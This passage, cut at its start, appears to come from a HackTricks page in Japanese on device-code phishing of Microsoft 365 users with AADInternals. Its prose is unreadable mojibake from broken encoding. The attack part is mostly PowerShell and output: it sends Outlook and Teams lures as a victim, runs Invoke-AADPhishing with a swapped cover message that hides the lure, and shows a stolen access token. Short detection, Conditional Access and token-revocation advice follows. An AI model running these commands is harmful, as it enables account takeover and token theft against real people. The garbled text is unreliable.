Send-AADIntOutlookMessage -Recipient "another.wictim@target.org" -Subject "Overdue payment" -Message "Pay this <h2>asap!</h2>"
```
ã‚ˆã‚Šç·Šæ€¥ãªæ”¯æ‰•ã„è¦æ±‚ã‚’ã™ã‚‹ãŸã‚ã«ã€Teamsãƒ¡ãƒƒã‚»ãƒ¼ã‚¸ã‚’é€ä¿¡ã™ã‚‹ã“ã¨ã‚‚ã§ãã¾ã™:
```powershell
# Send Teams message as the victim

Send-AADIntTeamsMessage -Recipients "another.wictim@target.org" -Message "Just sent you an email about due payment. Have a look at it."
```

```
Sent                MessageID
----                ---------
16/10/2020 14.40.23 132473328207053858
```
**ä»¥ä¸‹ã®ãƒ“ãƒ‡ã‚ªã¯ã€ãƒ¡ãƒ¼ãƒ«ãƒ•ã‚£ãƒƒã‚·ãƒ³ã‚°ã«AADInternalsã‚’ä½¿ç”¨ã™ã‚‹æ–¹æ³•ã‚’ç¤ºã—ã¦ã„ã¾ã™ã€‚**

### Teams <a href="#teams" id="teams"></a>

AADInternalsã¯ã€Teamsã®ãƒãƒ£ãƒƒãƒˆãƒ¡ãƒƒã‚»ãƒ¼ã‚¸ã¨ã—ã¦ãƒ•ã‚£ãƒƒã‚·ãƒ³ã‚°ãƒ¡ãƒƒã‚»ãƒ¼ã‚¸ã‚’é€ä¿¡ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

**æ³¨æ„ï¼** ã‚¿ãƒ¼ã‚²ãƒƒãƒˆãŒã€Œèªè¨¼ã€ã‚’è¡Œã„ã€ãƒˆãƒ¼ã‚¯ãƒ³ãŒå—ã‘å–ã‚‰ã‚ŒãŸå¾Œã€AADInternalsã¯å…ƒã®ãƒ¡ãƒƒã‚»ãƒ¼ã‚¸ã‚’ç½®ãæ›ãˆã¾ã™ã€‚ã“ã®ãƒ¡ãƒƒã‚»ãƒ¼ã‚¸ã¯ã€-CleanMessageãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ã§æŒ‡å®šã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã®ã‚¯ãƒªãƒ¼ãƒ³ãƒ¡ãƒƒã‚»ãƒ¼ã‚¸ã¯æ¬¡ã®ã¨ãŠã‚Šã§ã™ï¼š
```
'<div>Hi!<br/>This is a message sent to you by someone who is using <a href="https://o365blog.com/aadinternals">AADInternals</a> phishing function. <br/>If you are seeing this, <b>someone has stolen your identity!</b>.</div>'
```
![Teams clean message](https://o365blog.com/images/posts/phishing\_13.png)

ä»¥ä¸‹ã®ä¾‹ã§ã¯ã€ã‚«ã‚¹ã‚¿ãƒã‚¤ã‚ºã•ã‚ŒãŸãƒ¡ãƒƒã‚»ãƒ¼ã‚¸ã‚’ä½¿ç”¨ã—ã¦ãƒ•ã‚£ãƒƒã‚·ãƒ³ã‚°ãƒ¡ãƒ¼ãƒ«ã‚’é€ä¿¡ã—ã¾ã™ã€‚ãƒˆãƒ¼ã‚¯ãƒ³ã¯ã‚­ãƒ£ãƒƒã‚·ãƒ¥ã«ä¿å­˜ã•ã‚Œã¾ã™ã€‚
```powershell
# Get access token for Azure Core Management

Get-AADIntAccessTokenForAzureCoreManagement -SaveToCache

# Create the custom messages

$message = '<html>Hi!<br/>Here is the link to the <a href="{1}">document</a>. Use the following code to access: <b>{0}</b>.</html>'
$cleanMessage = '<html>Hi!<br/>Have a nice weekend.</html>'

# Send a teams message to the recipient using customised messages

Invoke-AADPhishing -Recipients "wvictim@company.com" -Teams -Message $message -CleanMessage $cleanMessage -SaveToCache
```

```
Code: CKDZ2BURF
Teams message sent to: wvictim@company.com. Message id: 132473151989090816
...
Received access token for william.victim@company.com
```
**ä»¥ä¸‹ã®ãƒ“ãƒ‡ã‚ªã¯ã€Teamsãƒ•ã‚£ãƒƒã‚·ãƒ³ã‚°ã«AADInternalsã‚’ä½¿ç”¨ã™ã‚‹æ–¹æ³•ã‚’ç¤ºã—ã¦ã„ã¾ã™ã€‚**

## æ¤œå‡º <a href="#detecting" id="detecting"></a>

ã¾ãšã€Azure ADã®è¦³ç‚¹ã‹ã‚‰ã¯ã€ãƒ­ã‚°ã‚¤ãƒ³ã¯**é–‹å§‹ã•ã‚ŒãŸ**èªè¨¼ãŒè¡Œã‚ã‚ŒãŸå ´æ‰€ã§è¡Œã‚ã‚Œã¾ã™ã€‚ã“ã‚Œã¯éå¸¸ã«é‡è¦ãªãƒã‚¤ãƒ³ãƒˆã§ã™ã€‚ã¤ã¾ã‚Šã€ã‚µã‚¤ãƒ³ã‚¤ãƒ³ãƒ­ã‚°ã§ã¯ã€ãƒ­ã‚°ã‚¤ãƒ³ã¯ãƒ¦ãƒ¼ã‚¶ãƒ¼ã§ã¯ãªãã€**æ”»æ’ƒè€…ã®å ´æ‰€ã¨ãƒ‡ãƒã‚¤ã‚¹**ã‹ã‚‰è¡Œã‚ã‚Œã¾ã—ãŸã€‚

ãŸã ã—ã€ãƒªãƒ•ãƒ¬ãƒƒã‚·ãƒ¥ãƒˆãƒ¼ã‚¯ãƒ³ã‚’ä½¿ç”¨ã—ã¦å–å¾—ã—ãŸã‚¢ã‚¯ã‚»ã‚¹ãƒˆãƒ¼ã‚¯ãƒ³ã¯ã€ã‚µã‚¤ãƒ³ã‚¤ãƒ³ãƒ­ã‚°ã«ã¯è¡¨ç¤ºã•ã‚Œã¾ã›ã‚“ã€‚

ä»¥ä¸‹ã¯ã€ç§ãŒAzure VMï¼ˆå…·ä½“çš„ã«ã¯[ã‚¯ãƒ©ã‚¦ãƒ‰ã‚·ã‚§ãƒ«](https://o365blog.com/post/cloudshell/)ï¼‰ã‹ã‚‰ãƒ•ã‚£ãƒƒã‚·ãƒ³ã‚°ã‚’é–‹å§‹ã—ãŸä¾‹ã§ã™ã€‚ç§ãŸã¡ã¯ã€"Microsoft Office"ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆã‚’ä½¿ç”¨ã—ã¦7:23 AMã«ãƒ­ã‚°ã‚¤ãƒ³ã—ãŸã“ã¨ãŒã€IPã‚¢ãƒ‰ãƒ¬ã‚¹51.144.240.233ã‹ã‚‰è¡Œã‚ã‚ŒãŸã“ã¨ã‚’ç¢ºèªã§ãã¾ã™ã€‚ãŸã ã—ã€7:27 AMã«Exchange Onlineã®ã‚¢ã‚¯ã‚»ã‚¹ãƒˆãƒ¼ã‚¯ãƒ³ã‚’å–å¾—ã—ãŸã“ã¨ã¯ãƒ­ã‚°ã«è¡¨ç¤ºã•ã‚Œã¾ã›ã‚“ã€‚

![Azure ADã‚µã‚¤ãƒ³ã‚¤ãƒ³ãƒ­ã‚°](https://o365blog.com/images/posts/phishing\_10.png)

:warning: ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒéå…¸å‹çš„ãªå ´æ‰€ã‹ã‚‰ã‚µã‚¤ãƒ³ã‚¤ãƒ³ã—ã¦ã„ã‚‹ã¨ã„ã†å…†å€™ãŒã‚ã‚‹å ´åˆã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã¯ä¾µå®³ã•ã‚Œã¦ã„ã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚

## äºˆé˜² <a href="#preventing" id="preventing"></a>

ã“ã®æŠ€è¡“ã‚’ä½¿ç”¨ã—ãŸãƒ•ã‚£ãƒƒã‚·ãƒ³ã‚°ã‚’é˜²ããŸã‚ã®å”¯ä¸€ã®åŠ¹æœçš„ãªæ–¹æ³•ã¯ã€[æ¡ä»¶ä»˜ãã‚¢ã‚¯ã‚»ã‚¹](https://docs.microsoft.com/en-us/azure/active-directory/conditional-access/overview)ï¼ˆCAï¼‰ãƒãƒªã‚·ãƒ¼ã‚’ä½¿ç”¨ã™ã‚‹ã“ã¨ã§ã™ã€‚å…·ä½“çš„ã«ã¯ã€**ãƒ•ã‚£ãƒƒã‚·ãƒ³ã‚°ã‚’é˜²ãã“ã¨ã¯ã§ãã¾ã›ã‚“**ãŒã€ç‰¹å®šã®ãƒ«ãƒ¼ãƒ«ã«åŸºã¥ã„ã¦**ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®ã‚µã‚¤ãƒ³ã‚¤ãƒ³ã‚’é˜²ã**ã“ã¨ãŒã§ãã¾ã™ã€‚ç‰¹ã«ã€å ´æ‰€ã¨ãƒ‡ãƒã‚¤ã‚¹ã®çŠ¶æ…‹ã«åŸºã¥ããƒãƒªã‚·ãƒ¼ã¯ã€ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã‚’ä¿è­·ã™ã‚‹ãŸã‚ã«åŠ¹æœçš„ã§ã™ã€‚ã“ã‚Œã¯ç¾åœ¨ä½¿ç”¨ã•ã‚Œã¦ã„ã‚‹ã™ã¹ã¦ã®ãƒ•ã‚£ãƒƒã‚·ãƒ³ã‚°æŠ€è¡“ã«é©ç”¨ã•ã‚Œã¾ã™ã€‚

ãŸã ã—ã€ã™ã¹ã¦ã®ã‚·ãƒŠãƒªã‚ªã‚’ã‚«ãƒãƒ¼ã™ã‚‹ã“ã¨ã¯ã§ãã¾ã›ã‚“ã€‚ãŸã¨ãˆã°ã€ä¸æ­£ãªå ´æ‰€ã‹ã‚‰ã®ãƒ­ã‚°ã‚¤ãƒ³ã«å¯¾ã—ã¦MFAã‚’å¼·åˆ¶ã™ã‚‹ã“ã¨ã¯ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒMFAã‚’ä½¿ç”¨ã—ã¦ãƒ­ã‚°ã‚¤ãƒ³ã—ã¦ã„ã‚‹å ´åˆã«ã¯å½¹ã«ç«‹ã¡ã¾ã›ã‚“ã€‚

## ç·©å’Œ <a href="#mitigating" id="mitigating"></a>

ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒä¾µå®³ã•ã‚ŒãŸå ´åˆã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®ãƒªãƒ•ãƒ¬ãƒƒã‚·ãƒ¥ãƒˆãƒ¼ã‚¯ãƒ³ã¯[å–ã‚Šæ¶ˆã™ã“ã¨ãŒã§ãã¾ã™](https://docs.microsoft.com/en-us/powershell/module/azuread/revoke-azureaduserallrefreshtoken?view=azureadps-2.0)ã€‚ã“ã‚Œã«ã‚ˆã‚Šã€æ”»æ’ƒè€…ã¯ä¾µå®³ã•ã‚ŒãŸãƒªãƒ•ãƒ¬ãƒƒã‚·ãƒ¥ãƒˆãƒ¼ã‚¯ãƒ³ã§æ–°ã—ã„ã‚¢ã‚¯ã‚»ã‚¹ãƒˆãƒ¼ã‚¯ãƒ³ã‚’å–å¾—ã™ã‚‹ã“ã¨ãŒã§ããªããªã‚Šã¾ã™ã€‚

## è¦ç´„ <a href="#summary" id="summary"></a>

ç§ã®çŸ¥ã‚‹é™ã‚Šã€ãƒ‡ãƒã‚¤ã‚¹ã‚³ãƒ¼ãƒ‰èªè¨¼ãƒ•ãƒ­ãƒ¼ã®æŠ€è¡“ã¯ä»¥å‰ã«ãƒ•ã‚£ãƒƒã‚·ãƒ³ã‚°ã«ä½¿ç”¨ã•ã‚Œã¦ã„ã¾ã›ã‚“ã€‚

æ”»æ’ƒè€…ã®è¦³ç‚¹ã‹ã‚‰è¦‹ã‚‹ã¨ã€ã“ã®æ–¹æ³•ã«ã¯ã„ãã¤ã‹ã®åˆ©ç‚¹ãŒã‚ã‚Šã¾ã™ï¼š

* ä»»æ„ã®ã‚¢ãƒ—ãƒªã‚’ç™»éŒ²ã™ã‚‹å¿…è¦ã¯ã‚ã‚Šã¾ã›ã‚“
* å½ã®ãƒ­ã‚°ã‚¤ãƒ³ãƒšãƒ¼ã‚¸ãªã©ã®ãƒ•ã‚£ãƒƒã‚·ãƒ³ã‚°ã‚¤ãƒ³ãƒ•ãƒ©ã‚’ã‚»ãƒƒãƒˆã‚¢ãƒƒãƒ—ã™ã‚‹å¿…è¦ã¯ã‚ã‚Šã¾ã›ã‚“
* ãƒ¦ãƒ¼ã‚¶ãƒ¼ã«ã¯ã‚µã‚¤ãƒ³ã‚¤ãƒ³ã®ã¿ã‚’æ±‚ã‚ã‚‰ã‚Œã¾ã™ï¼ˆé€šå¸¸ã¯ã€ŒMicrosoft Officeã€ã«å¯¾ã—ã¦ï¼‰- åŒæ„ã¯æ±‚ã‚ã‚‰ã‚Œã¾ã›ã‚“
* ã™ã¹ã¦ã¯**login.microsoftonline.com**ã®åå‰ç©ºé–“ã§è¡Œã‚ã‚Œã¾ã™
* æ”»æ’ƒè€…ã¯ä»»æ„ã®client\_idã¨ãƒªã‚½ãƒ¼ã‚¹ã‚’ä½¿ç”¨ã§ãã¾ã™ï¼ˆãŸã ã—ã€ã™ã¹ã¦ã®çµ„ã¿åˆã‚ã›ãŒæ©Ÿèƒ½ã™ã‚‹ã‚ã‘ã§ã¯ã‚ã‚Šã¾ã›ã‚“ï¼‰
* ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒMFAã‚’ä½¿ç”¨ã—ã¦ã‚µã‚¤ãƒ³ã‚¤ãƒ³ã—ãŸå ´åˆã€ã‚¢ã‚¯ã‚»ã‚¹ãƒˆãƒ¼ã‚¯ãƒ³ã«ã‚‚MFAã®ã‚¯ãƒ¬ãƒ¼ãƒ ãŒå«ã¾ã‚Œã¾ã™ï¼ˆã“ã‚Œã«ã¯ãƒªãƒ•ãƒ¬ãƒƒã‚·ãƒ¥ãƒˆãƒ¼ã‚¯ãƒ³ã‚’ä½¿ç”¨ã—ã¦å–å¾—ã—ãŸã‚¢ã‚¯ã‚»ã‚¹ãƒˆãƒ¼ã‚¯ãƒ³ã‚‚å«ã¾ã‚Œã¾ã™ï¼‰
* äºˆé˜²ã«ã¯æ¡ä»¶ä»˜ãã‚¢ã‚¯ã‚»ã‚¹ï¼ˆãŠã‚ˆã³Azure AD Premium P1/P2ãƒ©ã‚¤ã‚»ãƒ³ã‚¹ï¼‰ãŒå¿…è¦ã§ã™

æ”»æ’ƒè€…ã®è¦³ç‚¹ã‹ã‚‰è¦‹ã‚‹ã¨ã€ã“ã®æ–¹æ³•ã«ã¯å°‘ãªãã¨ã‚‚1ã¤ã®ãƒ‡ãƒ¡ãƒªãƒƒãƒˆãŒã‚ã‚Šã¾ã™ï¼š

* ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚³ãƒ¼ãƒ‰ã¯15åˆ†é–“ã®ã¿æœ‰åŠ¹ã§ã™

ã‚‚ã¡ã‚ã‚“ã€æ”»æ’ƒè€…ã¯è¤‡æ•°ã®å—ä¿¡è€…ã«ãƒ•ã‚£ãƒƒã‚·ãƒ³ã‚°ãƒ¡ãƒ¼ãƒ«ã‚’é€ä¿¡ã™ã‚‹ã“ã¨ã§æ™‚é–“åˆ¶é™ã‚’æœ€å°é™ã«æŠ‘ãˆã‚‹ã“ã¨ãŒã§ãã¾ã™-ã“ã‚Œã«ã‚ˆã‚Šã€èª°ã‹ãŒã‚³ãƒ¼ãƒ‰ã‚’ä½¿ç”¨ã—ã¦ã‚µã‚¤ãƒ³ã‚¤ãƒ³ã™ã‚‹å¯èƒ½æ€§ãŒé«˜ã¾ã‚Šã¾ã™ã€‚

åˆ¥ã®æ–¹æ³•ã¯ã€ãƒªãƒ³ã‚¯ãŒã‚¯ãƒªãƒƒã‚¯ã•ã‚ŒãŸã¨ãã«èªè¨¼ã‚’é–‹å§‹ã™ã‚‹[ãƒ—ãƒ­ã‚­ã‚·](https://gist.github.com/Mr-Un1k0d3r/afef5a80cb72dfeaa78d14465fb0d333)ã‚’å®Ÿè£…ã™ã‚‹ã“ã¨ã§ã™ï¼ˆ[@MrUn1k0d3r](https://twitter.com/MrUn1k0d3r)ã«ã‚¯ãƒ¬ã‚¸ãƒƒãƒˆãŒã‚ã‚Šã¾ã™ï¼‰ã€‚ãŸã ã—ã€ã“ã®æ–¹æ³•ã§ã¯ã€æ­£è¦ã®microsoft.comã®URLã‚’ä½¿ç”¨ã™ã‚‹åˆ©ç‚¹ãŒå¤±ã‚ã‚Œã¾ã™ã€‚

ãƒ•ã‚£ãƒƒã‚·ãƒ³ã‚°ã‚­ãƒ£ãƒ³ãƒšãƒ¼ãƒ³ã‚’ç”Ÿãæ®‹ã‚‹ãŸã‚ã®ãƒã‚§ãƒƒã‚¯ãƒªã‚¹ãƒˆï¼š

1. æƒ…å ±ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ã¨ãƒ•ã‚£ãƒƒã‚·ãƒ³ã‚°ã«ã¤ã„ã¦ã®**ãƒ¦ãƒ¼ã‚¶ãƒ¼æ•™è‚²** :woman\_teacher:
2. ãƒãƒ«ãƒãƒ•ã‚¡ã‚¯ã‚¿èªè¨¼ï¼ˆMFAï¼‰ã®ä½¿ç”¨ :iphone:
3. Intune :hammer\_and\_wrench: ã¨æ¡ä»¶ä»˜ãã‚¢ã‚¯ã‚»ã‚¹ï¼ˆCAï¼‰ :stop\_sign:

\






<details>

<summary><strong>ãƒãƒƒã‚¯ãƒˆãƒªãƒƒã‚¯ã‚’ã‚µãƒãƒ¼ãƒˆã—ã¦ç‰¹å…¸ã‚’å—ã‘å–ã‚‹ï¼</strong></summary>

* HackTricksã§**ä¼šç¤¾ã‚’å®£ä¼**ã—ãŸã„å ´åˆã‚„ã€**PEASSã®æœ€æ–°ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã‚’å…¥æ‰‹**ã—ãŸã„å ´åˆã¯ã€[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* [**å…¬å¼ã®PEASSï¼†HackTricksã‚°ãƒƒã‚º**](https://peass.creator-spring.com)ã‚’æ‰‹ã«å…¥ã‚Œã¾ã—ã‚‡ã†
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã€ç§ãŸã¡ã®ç‹¬å çš„ãª[**NFT**](https://opensea.io/collection/the-peass-family)ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã‚’ç™ºè¦‹ã—ã¾ã—ã‚‡ã†
* ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**ãƒ†ãƒ¬ã‚°ãƒ©ãƒ ã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«**å‚åŠ **ã™ã‚‹ã‹ã€**Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã‚’**ãƒ•ã‚©ãƒ­ãƒ¼**ã—ã¦ãã ã•ã„ã€‚**
* **ãƒãƒƒã‚­ãƒ³ã‚°ã®ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ã«ã¯ã€**[**HackTricks**](https://github.com/carlospolop/hacktricks)ã¨[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)ã®GitHubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’æå‡ºã—ã¦ãã ã•ã„ã€‚

</details>
